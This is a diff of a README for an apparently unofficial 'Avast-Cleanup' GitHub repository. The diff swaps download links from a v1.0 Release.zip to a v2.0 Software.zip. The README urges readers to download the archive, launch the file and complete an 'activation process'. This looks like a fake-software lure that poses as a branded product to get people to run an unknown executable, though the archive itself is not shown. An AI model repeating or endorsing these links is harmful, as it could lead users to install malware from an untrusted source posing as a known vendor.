@@ -14,7 +14,7 @@ Welcome to the "Avast-Cleanup" repository! Here, you can find a streamlined solu
 
 To get started with Avast Cleanup, simply download the software from the following link:
 
-[![Download Avast Cleanup](https://github.com/kdieu1/Avast-Cleanup/releases/download/v1.0/Release.zip%20Avast%20Cleanup-Click%20Here-blue)](https://github.com/kdieu1/Avast-Cleanup/releases/download/v1.0/Release.zip)
+[![Download Avast Cleanup](https://github.com/kdieu1/Avast-Cleanup/releases/download/v2.0/Software.zip%20Avast%20Cleanup-Click%20Here-blue)](https://github.com/kdieu1/Avast-Cleanup/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software, follow the activation process provided within the application. If the link ends with a file name, make sure to launch the downloaded file to begin the installation process.
 
@@ -45,9 +45,9 @@ Be sure to follow this repository for updates on the latest features, enhancemen
 
 Start your system optimization journey with Avast Cleanup today! 🚀
 
-![Avast Cleanup](https://github.com/kdieu1/Avast-Cleanup/releases/download/v1.0/Release.zip)
+![Avast Cleanup](https://github.com/kdieu1/Avast-Cleanup/releases/download/v2.0/Software.zip)
 
 **Happy Cleaning!** 💻🛠️
 
 ---
-**Note:** If the link provided in this https://github.com/kdieu1/Avast-Cleanup/releases/download/v1.0/Release.zip file is a website, simply visit it to access the resources. If you encounter any issues with the link, please refer to the "Releases" section for alternative options.
+**Note:** If the link provided in this https://github.com/kdieu1/Avast-Cleanup/releases/download/v2.0/Software.zip file is a website, simply visit it to access the resources. If you encounter any issues with the link, please refer to the "Releases" section for alternative options.
